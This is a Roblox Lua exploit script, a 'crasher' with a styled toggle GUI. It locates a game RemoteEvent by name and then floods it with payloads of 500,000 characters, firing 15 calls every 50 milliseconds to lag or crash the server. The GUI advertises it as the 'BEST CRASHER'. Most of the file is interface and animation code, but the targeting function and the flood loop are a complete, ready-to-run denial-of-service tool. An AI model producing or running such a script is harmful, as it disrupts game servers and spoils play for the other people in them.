--// SERVICES
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

--// PLAYER
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// CLEANUP
for _, v in pairs(playerGui:GetChildren()) do
    if v.Name == "TuffLag_V4" then v:Destroy() end
end

--// VARIABLES
local isEnabled = false
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
local num = string.rep("z", 500000)

--// TARGETING LOGIC
local function FindTarget()
    local names = {"WhyAreTheyTargetingMe!!", "RobloxChatSystemMessage", "Chat", "AFK", "FisherMan"}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            for _, n in ipairs(names) do 
                if v.Name == n then return v end 
            end
        end
    end
end

local target = FindTarget()

--// UI SETUP
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TuffLag_V4"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

-- Main Container with Shadow Effect
local Shadow = Instance.new("Frame", ScreenGui)
Shadow.Size = UDim2.new(0, 320, 0, 200)
Shadow.Position = UDim2.fromScale(0.5, 0.5)
Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Shadow.BackgroundTransparency = 0.5
Shadow.BorderSizePixel = 0

local ShadowCorner = Instance.new("UICorner", Shadow)
ShadowCorner.CornerRadius = UDim.new(0, 16)

-- Main Frame
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 200)
Main.Position = UDim2.fromScale(0.5, 0.5)
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.ZIndex = 2

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 12)

-- Accent Border
local AccentBorder = Instance.new("UIStroke", Main)
AccentBorder.Thickness = 2
AccentBorder.Color = Color3.fromRGB(255, 255, 255)
AccentBorder.Transparency = 0

-- Header Bar
local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Header.BorderSizePixel = 0
Header.ZIndex = 3

local HeaderCorner = Instance.new("UICorner", Header)
HeaderCorner.CornerRadius = UDim.new(0, 12)

-- Fix header bottom corners
local HeaderFix = Instance.new("Frame", Header)
HeaderFix.Size = UDim2.new(1, 0, 0, 12)
HeaderFix.Position = UDim2.new(0, 0, 1, -12)
HeaderFix.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HeaderFix.BorderSizePixel = 0
HeaderFix.ZIndex = 3

-- Title Icon
local Icon = Instance.new("TextLabel", Header)
Icon.Size = UDim2.new(0, 30, 0, 30)
Icon.Position = UDim2.new(0, 15, 0.5, -15)
Icon.BackgroundTransparency = 1
Icon.Text = "⚠️"
Icon.Font = Enum.Font.GothamBold
Icon.TextColor3 = Color3.fromRGB(255, 255, 255)
Icon.TextSize = 24
Icon.ZIndex = 4

-- Title Text
local Title = Instance.new("TextLabel", Header)
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 50, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = target and "2WAY CRASHER" or "SEARCHING..."
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 4

-- Status Indicator
local StatusDot = Instance.new("Frame", Header)
StatusDot.Size = UDim2.new(0, 8, 0, 8)
StatusDot.Position = UDim2.new(1, -20, 0.5, -4)
StatusDot.BackgroundColor3 = target and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 50, 50)
StatusDot.BorderSizePixel = 0
StatusDot.ZIndex = 4

local DotCorner = Instance.new("UICorner", StatusDot)
DotCorner.CornerRadius = UDim.new(1, 0)

-- Target Info Panel
local InfoPanel = Instance.new("Frame", Main)
InfoPanel.Size = UDim2.new(1, -30, 0, 40)
InfoPanel.Position = UDim2.new(0, 15, 0, 60)
InfoPanel.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
InfoPanel.BorderSizePixel = 0
InfoPanel.ZIndex = 3

local InfoCorner = Instance.new("UICorner", InfoPanel)
InfoCorner.CornerRadius = UDim.new(0, 8)

local InfoStroke = Instance.new("UIStroke", InfoPanel)
InfoStroke.Thickness = 1
InfoStroke.Color = Color3.fromRGB(60, 60, 60)

local InfoLabel = Instance.new("TextLabel", InfoPanel)
InfoLabel.Size = UDim2.new(1, -20, 1, 0)
InfoLabel.Position = UDim2.new(0, 10, 0, 0)
InfoLabel.BackgroundTransparency = 1
InfoLabel.Text = target and ("BEST CRASHER? #👀│vouch")
InfoLabel.Font = Enum.Font.GothamMedium
InfoLabel.TextColor3 = target and Color3.fromRGB(200, 200, 200) or Color3.fromRGB(255, 100, 100)
InfoLabel.TextSize = 12
InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
InfoLabel.TextTruncate = Enum.TextTruncate.AtEnd
InfoLabel.ZIndex = 4

-- Toggle Button
local Button = Instance.new("TextButton", Main)
Button.Size = UDim2.new(1, -30, 0, 50)
Button.Position = UDim2.new(0, 15, 0, 115)
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.TextColor3 = Color3.fromRGB(18, 18, 18)
Button.Font = Enum.Font.GothamBold
Button.TextSize = 16
Button.Text = "DISABLED"
Button.AutoButtonColor = false
Button.ZIndex = 3

local ButtonCorner = Instance.new("UICorner", Button)
ButtonCorner.CornerRadius = UDim.new(0, 8)

local ButtonStroke = Instance.new("UIStroke", Button)
ButtonStroke.Thickness = 2
ButtonStroke.Color = Color3.fromRGB(255, 255, 255)
ButtonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Button Icon
local ButtonIcon = Instance.new("TextLabel", Button)
ButtonIcon.Size = UDim2.new(0, 20, 0, 20)
ButtonIcon.Position = UDim2.new(0, 15, 0.5, -10)
ButtonIcon.BackgroundTransparency = 1
ButtonIcon.Text = "○"
ButtonIcon.Font = Enum.Font.GothamBold
ButtonIcon.TextColor3 = Color3.fromRGB(18, 18, 18)
ButtonIcon.TextSize = 18
ButtonIcon.ZIndex = 4

--// ANIMATIONS
local function PulseStatusDot()
    task.spawn(function()
        while isEnabled do
            TweenService:Create(StatusDot, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), 
                {BackgroundTransparency = 0.3}):Play()
            task.wait(0.5)
            TweenService:Create(StatusDot, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), 
                {BackgroundTransparency = 0}):Play()
            task.wait(0.5)
        end
        StatusDot.BackgroundTransparency = 0
    end)
end

local function BorderPulse()
    task.spawn(function()
        while isEnabled do
            TweenService:Create(AccentBorder, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), 
                {Color = Color3.fromRGB(255, 50, 50)}):Play()
            task.wait(0.8)
            TweenService:Create(AccentBorder, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), 
                {Color = Color3.fromRGB(255, 255, 255)}):Play()
            task.wait(0.8)
        end
        AccentBorder.Color = Color3.fromRGB(255, 255, 255)
    end)
end

-- Button Hover Effect
Button.MouseEnter:Connect(function()
    TweenService:Create(Button, TweenInfo.new(0.2), {Size = UDim2.new(1, -26, 0, 50)}):Play()
    if not isEnabled then
        TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(240, 240, 240)}):Play()
    end
end)

Button.MouseLeave:Connect(function()
    TweenService:Create(Button, TweenInfo.new(0.2), {Size = UDim2.new(1, -30, 0, 50)}):Play()
    if not isEnabled then
        TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
    end
end)

-- Button Click Handler
Button.MouseButton1Click:Connect(function()
    -- Click animation
    local originalSize = Button.Size
    TweenService:Create(Button, TweenInfo.new(0.1), {Size = UDim2.new(1, -34, 0, 48)}):Play()
    task.wait(0.1)
    TweenService:Create(Button, TweenInfo.new(0.1), {Size = originalSize}):Play()
    
    isEnabled = not isEnabled
    
    if isEnabled then
        Button.Text = "ACTIVE"
        ButtonIcon.Text = "●"
        TweenService:Create(Button, TweenInfo.new(0.3), {
            BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        }):Play()
        TweenService:Create(Button, TweenInfo.new(0.3), {
            TextColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
        TweenService:Create(ButtonIcon, TweenInfo.new(0.3), {
            TextColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.3), {
            Color = Color3.fromRGB(255, 50, 50)
        }):Play()
        
        StatusDot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        PulseStatusDot()
        BorderPulse()
    else
        Button.Text = "DISABLED"
        ButtonIcon.Text = "○"
        TweenService:Create(Button, TweenInfo.new(0.3), {
            BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
        TweenService:Create(Button, TweenInfo.new(0.3), {
            TextColor3 = Color3.fromRGB(18, 18, 18)
        }):Play()
        TweenService:Create(ButtonIcon, TweenInfo.new(0.3), {
            TextColor3 = Color3.fromRGB(18, 18, 18)
        }):Play()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.3), {
            Color = Color3.fromRGB(255, 255, 255)
        }):Play()
        
        StatusDot.BackgroundColor3 = target and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 50, 50)
    end
end)

--// THE LAG LOOP
task.spawn(function()
    while true do
        if isEnabled and target then 
            for i = 1, 15 do 
                pcall(function()
                    target:FireServer(uuid, num) 
                end)
            end 
        end
        task.wait(0.05)
    end
end)

-- Entrance Animation
Main.Size = UDim2.new(0, 0, 0, 0)
Shadow.Size = UDim2.new(0, 0, 0, 0)
Main.BackgroundTransparency = 1
Shadow.BackgroundTransparency = 1
AccentBorder.Transparency = 1

task.wait(0.1)

-- Fade in shadow
TweenService:Create(Shadow, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {
    Size = UDim2.new(0, 326, 0, 206),
    BackgroundTransparency = 0.5
}):Play()

-- Scale in main frame
TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 320, 0, 200),
    BackgroundTransparency = 0
}):Play()

TweenService:Create(AccentBorder, TweenInfo.new(0.5), {
    Transparency = 0
}):Play()

-- Slide in content
Header.Position = UDim2.new(0, 0, 0, -50)
InfoPanel.Position = UDim2.new(0, 15, 0, 110)
Button.Position = UDim2.new(0, 15, 0, 165)

task.wait(0.3)

TweenService:Create(Header, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
    Position = UDim2.new(0, 0, 0, 0)
}):Play()

task.wait(0.1)

TweenService:Create(InfoPanel, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
    Position = UDim2.new(0, 15, 0, 60)
}):Play()

task.wait(0.1)

TweenService:Create(Button, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
    Position = UDim2.new(0, 15, 0, 115)
}):Play()

-- Dragging sync for shadow
Main:GetPropertyChangedSignal("Position"):Connect(function()
    Shadow.Position = Main.Position + UDim2.new(0, 3, 0, 3)
end)

print("⚡ GUI Loaded | Target: " .. (target and target.Name or "NONE FOUND"))
